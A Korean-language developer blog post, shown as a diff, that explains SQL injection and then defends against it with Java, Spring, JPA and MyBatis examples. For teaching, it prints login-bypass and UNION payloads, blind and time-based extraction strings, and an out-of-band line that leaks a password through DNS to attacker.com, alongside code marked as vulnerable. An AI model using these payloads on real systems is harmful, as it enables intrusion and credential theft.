@@ -1,0 +1,248 @@
+---
+title: SQL Injection — 원리부터 방어까지
+date: '2026-04-04'
+category: Backend
+tags:
+  - SQL Injection
+  - 보안
+  - OWASP
+  - Spring
+  - JPA
+summary: >-
+  SQL Injection은 OWASP Top 10에 매년 이름을 올리는 고전적이면서 치명적인 취약점이다. 공격 원리와 유형을 코드로 살펴보고, PreparedStatement·ORM·입력 검증으로 방어하는 방법을 정리한다.
+thumbnail: /thumbnails/sql-injection.svg
+---
+
+SQL Injection은 수십 년 전에 발견되었지만 지금도 OWASP Top 10에 꾸준히 등장하는 취약점이다. 원리가 단순해서 공격자 입장에서는 진입 장벽이 낮고, 피해는 데이터베이스 전체를 날려버릴 수 있을 만큼 크다.
+
+## 공격 원리
+
+SQL Injection은 **사용자 입력이 SQL 쿼리의 일부로 그대로 삽입될 때** 발생한다. 공격자는 입력값에 SQL 문법을 끼워 넣어 쿼리의 의미를 바꾼다.
+
+### 취약한 코드 예시 (Java)
+
+```java
+// 위험: 사용자 입력을 문자열로 직접 이어붙임
+String sql = "SELECT * FROM users WHERE username = '" + username + "'"
+           + " AND password = '" + password + "'";
+Statement stmt = conn.createStatement();
+ResultSet rs = stmt.executeQuery(sql);
+```
+
+정상 입력 `username = alice`, `password = secret`이면 쿼리는 이렇게 된다.
+
+```sql
+SELECT * FROM users WHERE username = 'alice' AND password = 'secret'
+```
+
+공격자가 `username`에 `' OR '1'='1' --`를 입력하면:
+
+```sql
+SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'
+```
+
+`'1'='1'`은 항상 참이고 `--` 이후는 주석 처리된다. WHERE 절이 무력화되어 모든 사용자 행이 반환되고, 첫 번째 계정(흔히 관리자)으로 로그인에 성공한다.
+
+---
+
+## SQL Injection 유형
+
+### 1. 클래식 인젝션 (In-band)
+
+공격 결과가 HTTP 응답에 직접 노출된다. 가장 단순하고 탐지가 쉽다.
+
+```
+입력: ' OR 1=1 --
+결과: 모든 행 반환, 인증 우회
+```
+
+```
+입력: ' UNION SELECT username, password FROM users --
+결과: 다른 테이블의 데이터가 응답에 포함됨
+```
+
+### 2. 블라인드 인젝션 (Blind)
+
+응답에 데이터가 직접 나오지 않지만, **조건의 참/거짓에 따라 응답이 달라지는 것**을 이용해 정보를 추출한다.
+
+```sql
+-- Boolean 기반: 참이면 정상 응답, 거짓이면 빈 결과
+' AND SUBSTRING(password, 1, 1) = 'a' --
+' AND SUBSTRING(password, 1, 1) = 'b' --
+-- 한 글자씩 반복해 비밀번호를 추출
+```
+
+```sql
+-- Time 기반: 응답 지연 시간으로 참/거짓을 판단
+' AND IF(1=1, SLEEP(3), 0) --   -- 3초 지연 → 참
+' AND IF(1=2, SLEEP(3), 0) --   -- 즉시 응답 → 거짓
+```
+
+### 3. Out-of-band
+
+DNS 요청이나 HTTP 요청 등 **외부 채널로 데이터를 유출**한다. 응답 채널이 전혀 없는 환경에서 사용된다.
+
+```sql
+-- MySQL: DNS 조회를 통해 데이터 유출
+' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a')) --
+```
+
+### 4. 2차 인젝션 (Second-order)
+
+입력 시점에는 무해해 보이지만, **저장된 값이 나중에 SQL로 실행될 때** 공격이 발동한다.
+
+```
+1단계: 회원가입 시 username으로 "admin'--" 저장
+       (이때는 이스케이프 처리되어 안전하게 저장)
+
+2단계: 비밀번호 변경 쿼리가 DB에서 username을 꺼내 SQL에 삽입
+       UPDATE users SET password='...' WHERE username='admin'--'
+       → admin 계정의 비밀번호가 바뀜
+```
+
+---
+
+## 피해 범위
+
+| 공격 유형 | 가능한 피해 |
+|----------|-----------|
+| 인증 우회 | 비밀번호 없이 로그인 |
+| 데이터 열람 | 전체 테이블 내용 탈취 |
+| 데이터 변조 | UPDATE/DELETE로 데이터 파괴 |
+| 시스템 명령 실행 | `xp_cmdshell`(MSSQL) 등으로 OS 명령 실행 |
+| 파일 읽기/쓰기 | `LOAD_FILE`, `INTO OUTFILE`(MySQL) |
+
+---
+
+## 방어 방법
+
+### 1. PreparedStatement (파라미터 바인딩)
+
+가장 확실한 방어책이다. SQL 구조와 데이터를 분리해 입력값이 절대 SQL 문법으로 해석되지 않는다.
+
+```java
+// 안전: PreparedStatement 사용
+String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement pstmt = conn.prepareStatement(sql);
+pstmt.setString(1, username);
+pstmt.setString(2, password);
+ResultSet rs = pstmt.executeQuery();
+```
+
+`?` 자리에 들어가는 값은 DB 드라이버가 내부적으로 이스케이프 처리한다. 공격자가 `' OR '1'='1`을 넣어도 문자열 리터럴로만 취급된다.
+
+### 2. ORM 사용 (JPA / Hibernate)
+
+JPA는 기본적으로 파라미터 바인딩을 사용해 SQL Injection을 방어한다.
+
+```java
+// 안전: JPA Repository
+Optional<User> user = userRepository.findByUsernameAndPassword(username, password);
+
+// 안전: JPQL 파라미터 바인딩
+@Query("SELECT u FROM User u WHERE u.username = :username AND u.password = :password")
+Optional<User> findUser(@Param("username") String username,
+                        @Param("password") String password);
+```
+
+단, **네이티브 쿼리에서 문자열을 직접 이어붙이면 ORM을 써도 취약하다.**
+
+```java
+// 위험: 네이티브 쿼리에서 문자열 연결
+@Query(value = "SELECT * FROM users WHERE username = '" + username + "'",
+       nativeQuery = true)
+// → 절대 이렇게 쓰지 않는다
+```
+
+### 3. MyBatis에서의 주의
+
+MyBatis는 `#{}` (파라미터 바인딩)과 `${}` (문자열 치환)을 구분한다.
+
+```xml
+<!-- 안전: #{} 사용 -->
+<select id="findUser" resultType="User">
+  SELECT * FROM users WHERE username = #{username}
+</select>
+
+<!-- 위험: ${} 사용 — 문자열이 그대로 삽입됨 -->
+<select id="findUser" resultType="User">
+  SELECT * FROM users WHERE username = '${username}'
+</select>
+```
+
+`${}`는 ORDER BY 컬럼명처럼 파라미터 바인딩이 불가능한 경우에만 사용하고, 반드시 화이트리스트 검증을 함께 적용해야 한다.
+
+```java
+// ORDER BY 컬럼명 화이트리스트 검증
+private static final Set<String> ALLOWED_COLUMNS = Set.of("name", "age", "createdAt");
+
+public List<User> findUsers(String orderBy) {
+    if (!ALLOWED_COLUMNS.contains(orderBy)) {
+        throw new IllegalArgumentException("허용되지 않은 정렬 컬럼: " + orderBy);
+    }
+    return userMapper.findUsersOrderBy(orderBy); // ${orderBy}
+}
+```
+
+### 4. 입력 검증
+
+파라미터 바인딩을 쓰더라도 입력 검증은 추가 방어층이 된다.
+
+```java
+// Spring Validation
+public class LoginRequest {
+    @NotBlank
+    @Size(max = 50)
+    @Pattern(regexp = "^[a-zA-Z0-9_]+$")  // 영문, 숫자, 언더스코어만 허용
+    private String username;
+
+    @NotBlank
+    @Size(min = 8, max = 100)
+    private String password;
+}
+```
+
+### 5. 최소 권한 원칙
+
+애플리케이션 DB 계정에 필요한 권한만 부여한다. 읽기 전용 작업에는 SELECT 권한만, 쓰기 작업에는 INSERT/UPDATE 권한만 허용한다. 공격에 성공하더라도 DROP TABLE 같은 파괴적 명령을 실행할 수 없다.
+
+```sql
+-- 애플리케이션용 계정에 최소 권한만 부여
+GRANT SELECT, INSERT, UPDATE ON mydb.* TO 'appuser'@'localhost';
+-- DROP, DELETE, TRUNCATE 등은 부여하지 않음
+```
+
+### 6. 에러 메시지 노출 금지
+
+상세한 DB 에러 메시지는 공격자에게 테이블 구조, 컬럼명, DB 종류 등 정보를 준다.
+
+```java
+// 위험: 상세 에러 노출
+catch (SQLException e) {
+    return ResponseEntity.badRequest().body(e.getMessage());
+    // "Table 'mydb.users' doesn't exist" 같은 정보 유출
+}
+
+// 안전: 일반적인 메시지만 반환, 상세 내용은 서버 로그에만 기록
+catch (SQLException e) {
+    log.error("DB error", e);
+    return ResponseEntity.internalServerError().body("서버 오류가 발생했습니다.");
+}
+```
+
+---
+
+## 방어 체크리스트
+
+| 항목 | 확인 |
+|------|------|
+| 모든 SQL 파라미터를 `?` 또는 Named Parameter로 바인딩 | ✅ |
+| MyBatis `${}` 사용 부분에 화이트리스트 검증 적용 | ✅ |
+| 사용자 입력에 대한 타입·길이·형식 검증 | ✅ |
+| DB 계정에 최소 권한만 부여 | ✅ |
+| 에러 메시지에 DB 정보 노출 없음 | ✅ |
+| WAF(Web Application Firewall) 또는 IDS 적용 | ✅ |
+
+---
+
+SQL Injection의 근본적인 방어는 **SQL 구조와 데이터를 항상 분리하는 것**이다. PreparedStatement와 ORM의 파라미터 바인딩을 일관되게 사용하고, 입력 검증과 최소 권한 원칙을 함께 적용하면 이 공격은 원천 차단된다.
